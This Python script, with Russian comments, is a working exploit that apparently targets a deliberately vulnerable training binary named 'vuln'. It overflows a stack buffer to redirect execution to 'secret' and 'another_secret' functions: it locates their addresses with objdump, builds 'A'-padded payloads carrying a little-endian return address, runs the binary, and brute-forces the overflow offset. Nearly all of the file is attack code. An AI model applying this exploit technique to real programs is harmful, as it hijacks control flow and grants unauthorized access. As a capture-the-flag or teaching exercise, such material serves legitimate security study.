#!/usr/bin/env python3
import struct
import os
import sys
import subprocess

def find_function_address(binary_name, function_name):
    """Находит адрес функции в бинарном файле используя objdump"""
    try:
        result = subprocess.check_output(f"objdump -d {binary_name} | grep -A 1 '<{function_name}>'", shell=True)
        address = result.decode().split('\n')[0].strip().split(' ')[0]
        return int(address, 16)
    except Exception as e:
        print(f"Error finding function address: {e}")
        return None

def create_exploit(offset, target_address, output_file="exploit_input"):
    """Создает эксплойт с заданным смещением и адресом назначения"""
    # Заполняем буфер 'A' до нужного смещения
    payload = b"A" * offset
    
    # Добавляем адрес целевой функции в little-endian формате
    payload += struct.pack("<I", target_address)
    
    # Записываем эксплойт в файл
    with open(output_file, "wb") as f:
        f.write(payload)
        
    print(f"[+] Exploit created and saved to {output_file}")
    print(f"[+] Offset: {offset}")
    print(f"[+] Target address: 0x{target_address:08x}")
    
    return payload

def run_exploit(binary_name, exploit_file="exploit_input", output_file="exploit_output"):
    """Запускает бинарный файл с эксплойтом и сохраняет вывод"""
    try:
        cmd = f"{binary_name} < {exploit_file}"
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        with open(output_file, "wb") as f:
            f.write(result.stdout)
            
        print(f"[+] Exploit run, output saved to {output_file}")
        print("[+] Output:")
        print(result.stdout.decode())
        
        return result.stdout
    except Exception as e:
        print(f"Error running exploit: {e}")
        return None

def brute_force_offset(binary_name, target_function, start_offset=64, end_offset=100):
    """Брутфорсит смещение для успешного эксплойта"""
    print(f"[*] Brute forcing offset from {start_offset} to {end_offset}...")
    
    target_address = find_function_address(binary_name, target_function)
    if not target_address:
        print(f"[-] Couldn't find address for {target_function}")
        return None
    
    for offset in range(start_offset, end_offset):
        print(f"[*] Trying offset: {offset}")
        
        payload = create_exploit(offset, target_address, "exploit_input")
        output = run_exploit(binary_name, "exploit_input", "exploit_output")
        
        if b"Access granted" in output or b"Exploit successful" in output:
            print(f"[+] Success! Correct offset found: {offset}")
            return offset
            
    print("[-] Failed to find correct offset")
    return None

if __name__ == "__main__":
    binary_name = "vuln"
    
    if len(sys.argv) > 1:
        # Если передан аргумент, используем его как имя функции для эксплойта
        target_function = sys.argv[1]
    else:
        # Иначе используем функцию secret по умолчанию
        target_function = "secret"
    
    print(f"[*] Target function: {target_function}")
    
    # 1. Анализ бинарного файла с помощью objdump
    print("[*] Analyzing binary...")
    target_address = find_function_address(binary_name, target_function)
    if not target_address:
        print(f"[-] Could not find function {target_function} in binary")
        sys.exit(1)
    
    print(f"[+] Found {target_function} at address: 0x{target_address:08x}")
    
    # 2. Создание эксплойта с определенным смещением
    # Обычно для этого примера, эмпирическим путем найдено смещение 76
    offset = 76
    
    print("[*] Creating exploit...")
    create_exploit(offset, target_address)
    
    # 3. Запуск эксплойта
    print("[*] Running exploit...")
    run_exploit(binary_name)
    
    # 4. Бонус: проверка смещения брутфорсом
    print("\n[*] Bonus: verifying offset by brute force...")
    brute_force_offset(binary_name, target_function, 70, 90)
    
    print("\n[*] Trying to exploit another_secret function...")
    another_address = find_function_address(binary_name, "another_secret")
    if another_address:
        print(f"[+] Found another_secret at address: 0x{another_address:08x}")
        create_exploit(offset, another_address, "exploit_input_another")
        run_exploit(binary_name, "exploit_input_another", "exploit_output_another") 